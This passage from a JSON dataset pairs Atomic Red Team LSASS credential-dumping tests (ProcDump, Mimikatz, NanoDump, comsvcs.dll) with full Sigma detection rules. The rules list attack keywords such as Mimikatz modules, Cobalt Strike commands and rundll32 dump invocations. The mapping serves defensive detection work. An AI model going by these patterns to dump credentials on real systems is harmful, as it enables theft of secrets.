                        "remote_content": "title: Suspicious Script Execution From Temp Folder\nid: a6a39bdb-935c-4f0a-ab77-35f4bbf44d33\nstatus: test\ndescription: Detects a suspicious script executions from temporary folder\nreferences:\n    - https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/\nauthor: Florian Roth (Nextron Systems), Max Altgelt (Nextron Systems), Tim Shelton\ndate: 2021-07-14\nmodified: 2022-10-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\mshta.exe'\n            - '\\wscript.exe'\n            - '\\cscript.exe'\n        CommandLine|contains:\n            - '\\Windows\\Temp'\n            - '\\Temporary Internet'\n            - '\\AppData\\Local\\Temp'\n            - '\\AppData\\Roaming\\Temp'\n            - '%TEMP%'\n            - '%TMP%'\n            - '%LocalAppData%\\Temp'\n    filter:\n        CommandLine|contains:\n            - ' >'\n            - 'Out-File'\n            - 'ConvertTo-Json'\n            - '-WindowStyle hidden -Verb runAs'  # VSCode behaviour if file cannot be written as current user\n            - '\\Windows\\system32\\config\\systemprofile\\AppData\\Local\\Temp\\Amazon\\EC2-Windows\\' # EC2 AWS\n    condition: selection and not filter\nfalsepositives:\n    - Administrative scripts\nlevel: high\n"
                    },
                    {
                        "rule_name": "LSASS Dump Keyword In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml",
                        "remote_content": "title: LSASS Dump Keyword In CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nrelated:\n    - id: a5a2d357-1ab8-4675-a967-ef9990a59391\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\nreferences:\n    - https://github.com/Hackndo/lsassy\n    - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n    - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n    - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n    - https://github.com/helpsystems/nanodump\n    - https://github.com/CCob/MirrorDump\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains:\n              - 'lsass.dmp'\n              - 'lsass.zip'\n              - 'lsass.rar'\n              - 'Andrew.dmp'\n              - 'Coredump.dmp'\n              - 'NotLSASS.zip'  # https://github.com/CCob/MirrorDump\n              - 'lsass_2'  # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp\n              - 'lsassdump'\n              - 'lsassdmp'\n        - CommandLine|contains|all:\n              - 'lsass'\n              - '.dmp'\n        - CommandLine|contains|all:\n              - 'SQLDmpr'\n              - '.mdmp'\n        - CommandLine|contains|all:\n              - 'nanodump'\n              - '.dmp'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "7cede33f-0acd-44ef-9774-15511300b24b",
                "atomic_attack_name": "Create Mini Dump of LSASS.exe using ProcDump",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Potential Execution of Sysinternals Tools",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
                    },
                    {
                        "rule_name": "Procdump Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_procdump.yml",
                        "remote_content": "title: Procdump Execution\nid: 2e65275c-8288-4ab4-aeb7-6274f58b6b20\nstatus: test\ndescription: Detects usage of the SysInternals Procdump utility\nreferences:\n    - https://learn.microsoft.com/en-us/sysinternals/downloads/procdump\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-08-16\nmodified: 2023-02-28\ntags:\n    - attack.defense-evasion\n    - attack.t1036\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith:\n            - '\\procdump.exe'\n            - '\\procdump64.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of procdump by a developer or administrator\nlevel: medium\n"
                    },
                    {
                        "rule_name": "LSASS Dump Keyword In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml",
                        "remote_content": "title: LSASS Dump Keyword In CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nrelated:\n    - id: a5a2d357-1ab8-4675-a967-ef9990a59391\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\nreferences:\n    - https://github.com/Hackndo/lsassy\n    - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n    - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n    - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n    - https://github.com/helpsystems/nanodump\n    - https://github.com/CCob/MirrorDump\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains:\n              - 'lsass.dmp'\n              - 'lsass.zip'\n              - 'lsass.rar'\n              - 'Andrew.dmp'\n              - 'Coredump.dmp'\n              - 'NotLSASS.zip'  # https://github.com/CCob/MirrorDump\n              - 'lsass_2'  # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp\n              - 'lsassdump'\n              - 'lsassdmp'\n        - CommandLine|contains|all:\n              - 'lsass'\n              - '.dmp'\n        - CommandLine|contains|all:\n              - 'SQLDmpr'\n              - '.mdmp'\n        - CommandLine|contains|all:\n              - 'nanodump'\n              - '.dmp'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "453acf13-1dbd-47d7-b28a-172ce9228023",
                "atomic_attack_name": "Offline Credential Theft With Mimikatz",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "HackTool - Mimikatz Execution",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_mimikatz_command_line.yml",
                        "remote_content": "title: HackTool - Mimikatz Execution\nid: a642964e-bead-4bed-8910-1bb4d63e3b4d\nstatus: test\ndescription: Detection well-known mimikatz command line arguments\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n    - https://tools.thehacker.recipes/mimikatz/modules\nauthor: Teymur Kheirkhabarov, oscd.community, David ANDRE (additional keywords), Tim Shelton\ndate: 2019-10-22\nmodified: 2023-02-21\ntags:\n    - attack.credential-access\n    - attack.t1003.001\n    - attack.t1003.002\n    - attack.t1003.004\n    - attack.t1003.005\n    - attack.t1003.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_tools_name:\n        CommandLine|contains:\n            - 'DumpCreds'\n            - 'mimikatz'\n    selection_function_names: # To cover functions from modules that are not in module_names\n        CommandLine|contains:\n            - '::aadcookie' # misc module\n            - '::detours' # misc module\n            - '::memssp' # misc module\n            - '::mflt' # misc module\n            - '::ncroutemon' # misc module\n            - '::ngcsign' # misc module\n            - '::printnightmare' # misc module\n            - '::skeleton' # misc module\n            - '::preshutdown'  # service module\n            - '::mstsc'  # ts module\n            - '::multirdp'  # ts module\n    selection_module_names:\n        CommandLine|contains:\n            - 'rpc::'\n            - 'token::'\n            - 'crypto::'\n            - 'dpapi::'\n            - 'sekurlsa::'\n            - 'kerberos::'\n            - 'lsadump::'\n            - 'privilege::'\n            - 'process::'\n            - 'vault::'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "LSASS Dump Keyword In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml",
                        "remote_content": "title: LSASS Dump Keyword In CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nrelated:\n    - id: a5a2d357-1ab8-4675-a967-ef9990a59391\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\nreferences:\n    - https://github.com/Hackndo/lsassy\n    - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n    - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n    - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n    - https://github.com/helpsystems/nanodump\n    - https://github.com/CCob/MirrorDump\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains:\n              - 'lsass.dmp'\n              - 'lsass.zip'\n              - 'lsass.rar'\n              - 'Andrew.dmp'\n              - 'Coredump.dmp'\n              - 'NotLSASS.zip'  # https://github.com/CCob/MirrorDump\n              - 'lsass_2'  # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp\n              - 'lsassdump'\n              - 'lsassdmp'\n        - CommandLine|contains|all:\n              - 'lsass'\n              - '.dmp'\n        - CommandLine|contains|all:\n              - 'SQLDmpr'\n              - '.mdmp'\n        - CommandLine|contains|all:\n              - 'nanodump'\n              - '.dmp'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "Operator Bloopers Cobalt Strike Commands",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_bloopers_cmd.yml",
                        "remote_content": "title: Operator Bloopers Cobalt Strike Commands\nid: 647c7b9e-d784-4fda-b9a0-45c565a7b729\nrelated:\n    - id: 4f154fb6-27d1-4813-a759-78b93e0b9c48\n      type: similar\nstatus: test\ndescription: Detects use of Cobalt Strike commands accidentally entered in the CMD shell\nreferences:\n    - https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/cobalt-4-5-user-guide.pdf\n    - https://thedfirreport.com/2021/10/04/bazarloader-and-the-conti-leaks/\n    - https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/\nauthor: _pete_0, TheDFIRReport\ndate: 2022-05-06\nmodified: 2023-01-30\ntags:\n    - attack.execution\n    - attack.t1059.003\n    - stp.1u\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - OriginalFileName: 'Cmd.Exe'\n        - Image|endswith: '\\cmd.exe'\n    selection_cli:\n        CommandLine|startswith:\n            - 'cmd '\n            - 'cmd.exe'\n            - 'c:\\windows\\system32\\cmd.exe'\n        CommandLine|contains:\n            - 'psinject'\n            - 'spawnas'\n            - 'make_token'\n            - 'remote-exec'\n            - 'rev2self'\n            - 'dcsync'\n            - 'logonpasswords'\n            - 'execute-assembly'\n            - 'getsystem'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "dddd4aca-bbed-46f0-984d-e4c5971c51ea",
                "atomic_attack_name": "Dump LSASS.exe Memory using NanoDump",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Use Short Name Path in Command Line",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "LSASS Dump Keyword In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml",
                        "remote_content": "title: LSASS Dump Keyword In CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nrelated:\n    - id: a5a2d357-1ab8-4675-a967-ef9990a59391\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\nreferences:\n    - https://github.com/Hackndo/lsassy\n    - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n    - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n    - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n    - https://github.com/helpsystems/nanodump\n    - https://github.com/CCob/MirrorDump\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains:\n              - 'lsass.dmp'\n              - 'lsass.zip'\n              - 'lsass.rar'\n              - 'Andrew.dmp'\n              - 'Coredump.dmp'\n              - 'NotLSASS.zip'  # https://github.com/CCob/MirrorDump\n              - 'lsass_2'  # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp\n              - 'lsassdump'\n              - 'lsassdmp'\n        - CommandLine|contains|all:\n              - 'lsass'\n              - '.dmp'\n        - CommandLine|contains|all:\n              - 'SQLDmpr'\n              - '.mdmp'\n        - CommandLine|contains|all:\n              - 'nanodump'\n              - '.dmp'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    }
                ]
            },
            {
                "tech_id": "T1003.001",
                "atomic_attack_guid": "2536dee2-12fb-459a-8c37-971844fa73be",
                "atomic_attack_name": "Dump LSASS.exe Memory using comsvcs.dll",
                "platform": "Windows",
                "sigma_rules": [
                    {
                        "rule_name": "Process Memory Dump Via Comsvcs.DLL",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml",
                        "remote_content": "title: Process Memory Dump Via Comsvcs.DLL\nid: 646ea171-dded-4578-8a4d-65e9822892e3\nrelated:\n    - id: 09e6d5c0-05b8-4ff8-9eeb-043046ec774c\n      type: obsolete\nstatus: test\ndescription: Detects a process memory dump via \"comsvcs.dll\" using rundll32, covering multiple different techniques (ordinal, minidump function, etc.)\nreferences:\n    - https://twitter.com/shantanukhande/status/1229348874298388484\n    - https://twitter.com/pythonresponder/status/1385064506049630211?s=21\n    - https://twitter.com/Hexacorn/status/1224848930795552769\n    - https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/\n    - https://twitter.com/SBousseaden/status/1167417096374050817\n    - https://twitter.com/Wietze/status/1542107456507203586\n    - https://github.com/Hackndo/lsassy/blob/14d8f8ae596ecf22b449bfe919829173b8a07635/lsassy/dumpmethod/comsvcs.py\n    - https://www.youtube.com/watch?v=52tAmVLg1KM&t=2070s\nauthor: Florian Roth (Nextron Systems), Modexp, Nasreddine Bencherchali (Nextron Systems), Swachchhanda Shrawan Poudel (Nextron Systems)\ndate: 2020-02-18\nmodified: 2025-02-23\ntags:\n    - attack.defense-evasion\n    - attack.credential-access\n    - attack.t1036\n    - attack.t1003.001\n    - car.2013-05-009\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\rundll32.exe'\n        - OriginalFileName: 'RUNDLL32.EXE'\n        - CommandLine|contains: 'rundll32'\n    selection_cli_1:\n        CommandLine|contains|all:\n            - 'comsvcs'\n            - 'full'\n        CommandLine|contains:\n            - '#-'\n            - '#+'\n            - '#24'\n            - '24 '\n            - 'MiniDump' # Matches MiniDump and MinidumpW\n            - '#65560' # ordinal is 16 bit ordinal, so if you make the number large enough (don't fit in 16 bit space), then it normally wraps around.  for e.g ordinal 24 can be also represented by 65560 (65536+24)\n    selection_generic:\n        CommandLine|contains|all:\n            - '24'\n            - 'comsvcs'\n            - 'full'\n        CommandLine|contains:\n            - ' #'\n            - ',#'\n            - ', #'\n            - '\"#'\n    condition: (selection_img and 1 of selection_cli_*) or selection_generic\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "PowerShell Get-Process LSASS",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_getprocess_lsass.yml",
                        "remote_content": "title: PowerShell Get-Process LSASS\nid: b2815d0d-7481-4bf0-9b6c-a4c48a94b349\nstatus: test\ndescription: Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity\nreferences:\n    - https://web.archive.org/web/20220205033028/https://twitter.com/PythonResponder/status/1385064506049630211\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-04-23\nmodified: 2023-01-05\ntags:\n    - attack.credential-access\n    - attack.t1552.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            # You can add more permutation as you see fit\n            - 'Get-Process lsas'\n            - 'ps lsas'\n            - 'gps lsas'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
                    },
                    {
                        "rule_name": "LSASS Dump Keyword In CommandLine",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_lsass_dmp_cli_keywords.yml",
                        "remote_content": "title: LSASS Dump Keyword In CommandLine\nid: ffa6861c-4461-4f59-8a41-578c39f3f23e\nrelated:\n    - id: a5a2d357-1ab8-4675-a967-ef9990a59391\n      type: derived\nstatus: test\ndescription: |\n    Detects the presence of the keywords \"lsass\" and \".dmp\" in the commandline, which could indicate a potential attempt to dump or create a dump of the lsass process.\nreferences:\n    - https://github.com/Hackndo/lsassy\n    - https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf\n    - https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/credential_access_lsass_memdump_file_created.toml\n    - https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/\n    - https://github.com/helpsystems/nanodump\n    - https://github.com/CCob/MirrorDump\nauthor: E.M. Anhaus, Tony Lambert, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-10-24\nmodified: 2023-08-29\ntags:\n    - attack.credential-access\n    - attack.t1003.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains:\n              - 'lsass.dmp'\n              - 'lsass.zip'\n              - 'lsass.rar'\n              - 'Andrew.dmp'\n              - 'Coredump.dmp'\n              - 'NotLSASS.zip'  # https://github.com/CCob/MirrorDump\n              - 'lsass_2'  # default format of procdump v9.0 is lsass_YYMMDD_HHmmss.dmp\n              - 'lsassdump'\n              - 'lsassdmp'\n        - CommandLine|contains|all:\n              - 'lsass'\n              - '.dmp'\n        - CommandLine|contains|all:\n              - 'SQLDmpr'\n              - '.mdmp'\n        - CommandLine|contains|all:\n              - 'nanodump'\n              - '.dmp'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n"
                    },
                    {
                        "rule_name": "Potentially Suspicious PowerShell Child Processes",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
                        "remote_content": "title: Potentially Suspicious PowerShell Child Processes\nid: e4b6d2a7-d8a4-4f19-acbd-943c16d90647\nstatus: test\ndescription: |\n    Detects potentially suspicious child processes spawned by PowerShell.\n    Use this rule to hunt for potential anomalies initiating from PowerShell scripts and commands.\nreferences:\n    - https://twitter.com/ankit_anubhav/status/1518835408502620162\nauthor: Florian Roth (Nextron Systems), Tim Shelton\ndate: 2022-04-26\nmodified: 2024-07-16\ntags:\n    - attack.execution\n    - attack.t1059.001\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\powershell_ise.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        Image|endswith:\n            - '\\bash.exe'\n            - '\\bitsadmin.exe'\n            - '\\certutil.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\wmic.exe'\n            - '\\wscript.exe'\n    filter_optional_amazon:\n        ParentCommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n        CommandLine|contains: '\\Program Files\\Amazon\\WorkspacesConfig\\Scripts\\'  # AWS Workspaces\n    filter_main_certutil_verify_store:\n        Image|endswith: '\\certutil.exe'\n        CommandLine|contains: '-verifystore '\n    filter_main_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains:\n            - 'qfe list'\n            - 'diskdrive '\n            - 'csproduct '\n            - 'computersystem '\n            - ' os '\n            - ''\n    condition: selection and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - False positives are to be expected from PowerShell scripts that might make use of additional binaries such as \"mshta\", \"bitsadmin\", etc. Apply additional filters for those scripts.\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Potentially Suspicious Rundll32 Activity",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml",
                        "remote_content": "title: Potentially Suspicious Rundll32 Activity\nid: e593cf51-88db-4ee1-b920-37e89012a3c9\nstatus: test\ndescription: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities\nreferences:\n    - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/\n    - https://twitter.com/Hexacorn/status/885258886428725250\n    - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52\n    - https://twitter.com/nas_bench/status/1433344116071583746 # dfshim.dll,ShOpenVerbShortcut\n    - https://twitter.com/eral4m/status/1479106975967240209 # scrobj.dll,GenerateTypeLib\n    - https://twitter.com/eral4m/status/1479080793003671557 # shimgvw.dll,ImageView_Fullscreen\nauthor: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)\ndate: 2019-01-16\nmodified: 2023-05-17\ntags:\n    - attack.defense-evasion\n    - attack.t1218.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - CommandLine|contains|all:\n              - 'javascript:'\n              - '.RegisterXLL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'OpenURLA'\n        - CommandLine|contains|all:\n              - 'url.dll'\n              - 'FileProtocolHandler'\n        - CommandLine|contains|all:\n              - 'zipfldr.dll'\n              - 'RouteTheCall'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'Control_RunDLL'\n        - CommandLine|contains|all:\n              - 'shell32.dll'\n              - 'ShellExec_RunDLL'\n        - CommandLine|contains|all:\n              - 'mshtml.dll'\n              - 'PrintHTML'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'advpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'LaunchINFSection'\n        - CommandLine|contains|all:\n              - 'ieadvpack.dll'\n              - 'RegisterOCX'\n        - CommandLine|contains|all:\n              - 'ieframe.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'shdocvw.dll'\n              - 'OpenURL'\n        - CommandLine|contains|all:\n              - 'syssetup.dll'\n              - 'SetupInfObjectInstallAction'\n        - CommandLine|contains|all:\n              - 'setupapi.dll'\n              - 'InstallHinfSection'\n        - CommandLine|contains|all:\n              - 'pcwutl.dll'\n              - 'LaunchApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbApplication'\n        - CommandLine|contains|all:\n              - 'dfshim.dll'\n              - 'ShOpenVerbShortcut'\n        - CommandLine|contains|all:\n              - 'scrobj.dll'\n              - 'GenerateTypeLib'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'shimgvw.dll'\n              - 'ImageView_Fullscreen'\n              - 'http'\n        - CommandLine|contains|all:\n              - 'comsvcs.dll'\n              - 'MiniDump'\n    filter_main_screensaver:\n        CommandLine|contains: 'shell32.dll,Control_RunDLL desk.cpl,screensaver,@screensaver'\n    filter_main_parent_cpl:  # Settings\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        ParentCommandLine|contains: '.cpl'\n        CommandLine|contains|all:\n            - 'Shell32.dll'\n            - 'Control_RunDLL'\n            - '.cpl'\n    filter_main_startmenu:\n        ParentImage: 'C:\\Windows\\System32\\control.exe'\n        CommandLine|startswith: '\"C:\\Windows\\system32\\rundll32.exe\" Shell32.dll,Control_RunDLL \"C:\\Windows\\System32\\'\n        CommandLine|endswith: '.cpl\",'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - False positives depend on scripts and administrative tools used in the monitored environment\nlevel: medium\n"
                    },
                    {
                        "rule_name": "Use Short Name Path in Command Line",
                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
